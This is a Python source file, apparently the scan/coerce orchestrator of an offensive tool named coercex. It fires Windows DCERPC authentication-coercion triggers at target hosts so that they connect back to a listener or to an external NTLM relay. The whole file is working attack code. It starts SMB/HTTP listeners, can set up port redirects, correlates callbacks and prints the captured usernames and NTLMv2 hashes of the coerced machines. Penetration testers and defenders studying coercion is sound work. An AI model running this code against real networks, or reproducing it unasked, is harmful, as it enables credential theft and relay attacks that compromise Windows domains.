"""Scan / coerce orchestrator.

Ties together the DCERPC connection pool, async listener, and method
registry into a high-performance concurrent pipeline.

Two modes:
  - scan:   Tries all path styles per method to detect vulnerabilities.
            Always starts HTTP + SMB listeners on 0.0.0.0.  If ``-l``
            is not given, the listener IP is auto-detected from the
            default network route.
  - coerce: Fires coercion triggers with UNC paths pointing at an
            **external** relay (e.g. ntlmrelayx) that the operator
            already started.  ``-l`` is required so we know where to
            point the paths, but coercex does **not** bind any port.
"""

from __future__ import annotations

import asyncio
import logging
import time

from rich.console import Console

from coercex.connection import DCERPCPool
from coercex.listener import AsyncListener
from coercex.methods import get_all_methods
from coercex.methods.base import CoercionMethod, PipeBinding
from coercex.redirect import PortRedirector, setup_redirect
from coercex.models import (
    Credentials,
    Mode,
    ScanConfig,
    ScanResult,
    ScanStats,
    STATUS_STYLE,
    Transport,
    TriggerResult,
)
from coercex.net import get_local_ip, random_string
from coercex.unc import build_unc_path

log = logging.getLogger("coercex.scanner")


class Scanner:
    """Orchestrates the coercion pipeline.

    Usage:
        scanner = Scanner(config)
        stats = await scanner.run()
    """

    def __init__(self, config: ScanConfig, console: Console | None = None):
        self.config = config
        self.console = console or Console(stderr=True)
        self.stats = ScanStats()
        self._pool: DCERPCPool | None = None
        self._listener: AsyncListener | None = None
        self._redirector: PortRedirector | None = None
        self._redirect_active: bool = False
        self._semaphore = asyncio.Semaphore(config.concurrency)

    def _unc_port(self, transport: Transport) -> int:
        """Port to embed in UNC paths.

        When port redirect is active, returns the *standard* port (445/80)
        so that UNC paths use normal SMB format (no ``@port``).  The kernel
        transparently forwards 445 → smb_port and 80 → http_port.

        When redirect is NOT active, returns the actual listener port so
        that ``build_unc_path()`` can embed ``@port`` for non-standard ports.
        """
        if transport == Transport.HTTP:
            return 80 if self._redirect_active else self.config.http_port
        else:
            return 445 if self._redirect_active else self.config.smb_port

    async def run(self) -> ScanStats:
        """Execute the scan and return aggregate stats."""
        creds = self.config.creds or Credentials()
        self._pool = DCERPCPool(creds, timeout=self.config.timeout)

        methods = get_all_methods(
            protocols=self.config.protocols,
            methods_filter=self.config.methods_filter,
            pipes_filter=self.config.pipes_filter,
        )
        if not methods:
            log.error("No methods matched filters")
            return self.stats

        self.stats.total_targets = len(self.config.targets)

        self.console.print(
            f"[bold cyan]coercex[/] | mode=[bold]{self.config.mode.name.lower()}[/] "
            f"targets=[bold]{len(self.config.targets)}[/] methods=[bold]{len(methods)}[/] "
            f"concurrency=[bold]{self.config.concurrency}[/]"
        )

        needs_redirect = self.config.redirect and (
            self.config.smb_port != 445 or self.config.http_port != 80
        )
        if needs_redirect:
            try:
                self._redirector = setup_redirect(
                    self.config.smb_port, self.config.http_port
                )
                self._redirect_active = True
                parts: list[str] = []
                if self.config.smb_port != 445:
                    parts.append(f"445→{self.config.smb_port}")
                if self.config.http_port != 80:
                    parts.append(f"80→{self.config.http_port}")
                self.console.print(
                    f"[green]Port redirect active[/] ({', '.join(parts)}) "
                    "— UNC paths use standard ports"
                )
            except RuntimeError as exc:
                self.console.print(
                    f"[bold red]Port redirect failed:[/] {exc}\n"
                    "[dim]Falling back to WebDAV @port format[/]"
                )

        # ── Scan mode: always start listener (auto-detect IP if needed) ─
        if self.config.mode == Mode.SCAN:
            if not self.config.listener_host:
                # Pass the first target IP for route-based interface selection
                first_target = self.config.targets[0] if self.config.targets else None
                self.config.listener_host = get_local_ip(first_target)
                self.console.print(
                    f"[dim]Auto-detected listener IP: "
                    f"[bold]{self.config.listener_host}[/][/]"
                )
            enable_http = Transport.HTTP in self.config.transport
            enable_smb = Transport.SMB in self.config.transport
            # When port redirect is active, always start the SMB listener:
            # targets commonly connect back via SMB port 445 even when the
            # trigger uses an HTTP/WebDAV UNC path, and the redirect already
            # forwards 445 to our SMB port.
            if self._redirect_active and not enable_smb:
                enable_smb = True
                log.debug(
                    "Enabling SMB listener (redirect active; targets may "
                    "call back via SMB even for HTTP triggers)"
                )
            self._listener = AsyncListener(
                host="0.0.0.0",
                http_port=self.config.http_port,
                smb_port=self.config.smb_port,
                enable_http=enable_http,
                enable_smb=enable_smb,
            )
            await self._listener.start()
            listener_parts: list[str] = []
            if enable_http:
                listener_parts.append(f"http={self.config.http_port}")
            if enable_smb:
                listener_parts.append(f"smb={self.config.smb_port}")
            self.console.print(
                f"[green]Listener started[/] ({', '.join(listener_parts)})"
            )

        try:
            if self.config.mode == Mode.SCAN:
                await self._run_scan(methods)
            elif self.config.mode == Mode.COERCE:
                await self._run_coerce(methods)
        finally:
            if self._pool:
                await self._pool.close_all()
            if self._listener:
                await self._listener.stop()
            if self._redirector:
                self._redirector.cleanup()
                self.console.print("[dim]Port redirect rules removed[/]")

        return self.stats

    async def _run_scan(self, methods: list[CoercionMethod]) -> None:
        """Scan mode: try all path styles per method to detect vulnerabilities."""
        allowed = self.config.transport
        tasks: list[asyncio.Task[None]] = []
        scan_start = time.monotonic()

        for target in self.config.targets:
            for method in methods:
                for binding in method.pipe_bindings:
                    for transport_name, path_style in method.path_styles:
                        transport = (
                            Transport.HTTP
                            if transport_name == "http"
                            else Transport.SMB
                        )
                        if transport not in allowed:
                            continue
                        task = asyncio.create_task(
                            self._attempt(
                                target,
                                method,
                                binding,
                                transport_override=transport,
                                path_style_override=path_style,
                            )
                        )
                        tasks.append(task)

        await asyncio.gather(*tasks, return_exceptions=True)

        # Drain period: keep the listener running while ongoing handshakes
        # complete, then sweep results to upgrade ACCESSIBLE → VULNERABLE
        # and enrich VULNERABLE results that are missing auth_user.
        await self._drain_callbacks(scan_start)

    # ── COERCE: targeted single-path triggers (no local listener) ──

    async def _run_coerce(self, methods: list[CoercionMethod]) -> None:
        """Coerce mode: fire each method once per transport, pointing at external relay."""
        tasks: list[asyncio.Task[None]] = []

        for target in self.config.targets:
            for method in methods:
                for binding in method.pipe_bindings:
                    for transport in self.config.transport:
                        task = asyncio.create_task(
                            self._attempt_coerce(target, method, binding, transport)
                        )
                        tasks.append(task)

        await asyncio.gather(*tasks, return_exceptions=True)

    # ── DRAIN: wait for late callbacks after all tasks complete ──────

    async def _drain_callbacks(self, scan_start: float) -> None:
        """Wait for late callbacks and enrich results.

        After all ``_attempt()`` tasks complete, ongoing SMB handshakes
        may still be running in the listener.  The per-attempt
        ``callback_timeout`` may have expired while the handshake was
        mid-flight (e.g. Type 3 NTLM not yet parsed).

        This method:
        1. Sleeps ``callback_timeout`` seconds so handshakes can finish.
        2. Sweeps ACCESSIBLE results → upgrades to VULNERABLE if a
           callback arrived from that target.
        3. Sweeps VULNERABLE results with empty ``auth_user`` → enriches
           them with NTLM credentials from the completed handshake.
        """
        if not self._listener:
            return

        needs_drain = any(
            r.result == TriggerResult.ACCESSIBLE
            or (r.result == TriggerResult.VULNERABLE and not r.auth_user)
            for r in self.stats.results
        )
        if not needs_drain:
            return

        log.debug(
            "Drain: waiting %ss for late callbacks / handshake completion",
            self.config.callback_timeout,
        )
        self.console.print(
            f"[dim]Waiting {self.config.callback_timeout:.0f}s for late callbacks…[/]"
        )
        await asyncio.sleep(self.config.callback_timeout)

        listener = self._listener
        for result in self.stats.results:
            if result.result == TriggerResult.ACCESSIBLE:
                cb = listener.get_callback_since(result.target, scan_start)
                if cb is not None:
                    result.result = TriggerResult.VULNERABLE
                    result.callback_received = True
                    result.source_ip = cb.source_ip
                    if cb.username:
                        result.auth_user = (
                            f"{cb.domain}\\{cb.username}" if cb.domain else cb.username
                        )
                    if cb.ntlmv2_hash:
                        result.ntlmv2_hash = cb.ntlmv2_hash
                    self.stats.vulnerable += 1
                    self.stats.accessible -= 1
                    self._emit(result)

            elif result.result == TriggerResult.VULNERABLE and not result.auth_user:
                # Callback arrived but handshake wasn't done yet.
                # Now the handshake may have completed; re-check.
                cb = listener.get_callback_since(result.target, scan_start)
                if cb is not None and cb.username:
                    result.auth_user = (
                        f"{cb.domain}\\{cb.username}" if cb.domain else cb.username
                    )
                    if cb.ntlmv2_hash and not result.ntlmv2_hash:
                        result.ntlmv2_hash = cb.ntlmv2_hash

    async def _attempt_coerce(
        self,
        target: str,
        method: CoercionMethod,
        binding: PipeBinding,
        transport: Transport,
    ) -> None:
        """Single coerce trigger — fire and report SENT, no classification.

        Coerce mode just sends triggers to an external relay.  We don't
        classify RPC results because the relay intercepts the auth and
        the RPC call will typically timeout or error.  We only distinguish
        between "we managed to send the trigger" (SENT) and "we couldn't
        even connect to the pipe" (CONNECT_ERROR).
        """
        pool = self._pool
        assert pool is not None
        async with self._semaphore:
            port = self._unc_port(transport)
            token = random_string(12)
            path = build_unc_path(
                self.config.listener_host,
                token,
                transport,
                port=port,
                path_style="share_file",
            )

            # Try to connect to the pipe
            try:
                dce = await pool.get_session(target, binding)
            except Exception as e:
                result = ScanResult(
                    target=target,
                    protocol=method.protocol_short,
                    method=method.function_name,
                    pipe=binding.pipe,
                    uuid=binding.uuid,
                    result=TriggerResult.CONNECT_ERROR,
                    transport=transport.name.lower(),
                    path_style="share_file",
                    error=str(e),
                )
                self.stats.add(result)
                self._emit(result)
                return

            # Fire the trigger — we don't care about the RPC response
            try:
                trigger_fn = method.trigger_fn
                if trigger_fn is None:
                    raise ValueError(f"No trigger function for {method.function_name}")
                await asyncio.to_thread(trigger_fn, dce, path, target)
            except Exception:
                pass  # Expected: relay intercepts auth, RPC call fails

            result = ScanResult(
                target=target,
                protocol=method.protocol_short,
                method=method.function_name,
                pipe=binding.pipe,
                uuid=binding.uuid,
                result=TriggerResult.SENT,
                transport=transport.name.lower(),
                path_style="share_file",
            )
            self.stats.add(result)
            self._emit(result)

    async def _attempt(
        self,
        target: str,
        method: CoercionMethod,
        binding: PipeBinding,
        transport_override: Transport | None = None,
        path_style_override: str | None = None,
    ) -> None:
        """Single trigger attempt, bounded by semaphore."""
        pool = self._pool
        assert pool is not None
        async with self._semaphore:
            transport = transport_override or Transport.SMB
            path_style = path_style_override or "share_file"

            use_listener = self.config.has_listener and self._listener is not None

            if not use_listener:
                # No listener: dummy path, classify errors only
                path = build_unc_path(
                    "127.0.0.1", "coercexscan", transport, path_style=path_style
                )
                result = await pool.trigger_method(target, method, binding, path)
            else:
                # Listener active: real path with correlation token
                listener = self._listener
                assert listener is not None
                token, future = listener.create_token(target_ip=target)

                port = self._unc_port(transport)
                path = build_unc_path(
                    self.config.listener_host,
                    token,
                    transport,
                    port=port,
                    path_style=path_style,
                )

                # Record wall-clock BEFORE trigger so we can check for
                # callbacks that arrived during this attempt's window
                # even if FIFO assigned them to the wrong token.
                t_before = time.monotonic()

                result = await pool.trigger_method(target, method, binding, path)

                # Wait for callback if trigger indicated vulnerability
                if result.result in (
                    TriggerResult.VULNERABLE,
                    TriggerResult.ACCESSIBLE,
                ):
                    try:
                        callback = await asyncio.wait_for(
                            future, timeout=self.config.callback_timeout
                        )
                        result.callback_received = True
                        result.source_ip = callback.source_ip
                        result.result = TriggerResult.VULNERABLE
                        # Propagate NTLM metadata from SMB2 handshake
                        if callback.ntlmv2_hash:
                            result.ntlmv2_hash = callback.ntlmv2_hash
                        if callback.username:
                            result.auth_user = (
                                f"{callback.domain}\\{callback.username}"
                                if callback.domain
                                else callback.username
                            )
                    except asyncio.TimeoutError:
                        # Token-based correlation failed (FIFO race).
                        # Fall back to timestamp check: did ANY callback
                        # arrive from this target since we fired?
                        fallback = listener.get_callback_since(target, t_before)
                        if fallback is not None:
                            result.callback_received = True
                            result.result = TriggerResult.VULNERABLE
                            result.source_ip = fallback.source_ip
                            if fallback.ntlmv2_hash:
                                result.ntlmv2_hash = fallback.ntlmv2_hash
                            if fallback.username:
                                result.auth_user = (
                                    f"{fallback.domain}\\{fallback.username}"
                                    if fallback.domain
                                    else fallback.username
                                )
                            log.debug(
                                "Timestamp fallback: %s %s::%s upgraded to VULNERABLE",
                                target,
                                method.protocol_short,
                                method.function_name,
                            )
                else:
                    listener.cancel_token(token)

            # Populate transport / path_style on every result
            result.transport = transport.name.lower()
            result.path_style = path_style

            self.stats.add(result)
            self._emit(result)

    def _emit(self, result: ScanResult) -> None:
        """Print a result line (only for interesting results unless verbose)."""
        show = self.config.verbose or result.result in (
            TriggerResult.VULNERABLE,
            TriggerResult.ACCESSIBLE,
            TriggerResult.SENT,
        )
        if show:
            style, sym = STATUS_STYLE.get(result.result, ("dim red", "[?]"))
            cb = " [bold green](callback!)[/]" if result.callback_received else ""
            tr = f" [dim]({result.transport})[/]" if result.transport else ""
            auth = f" [bold magenta]{result.auth_user}[/]" if result.auth_user else ""
            self.console.print(
                f"[{style}]{sym}[/] {result.target} | "
                f"[blue]{result.protocol}[/]::{result.method} "
                f"via [dim]{result.pipe}[/]{tr}{cb}{auth}"
            )
            if result.ntlmv2_hash:
                self.console.print(f"    [bold yellow]Hash:[/] {result.ntlmv2_hash}")
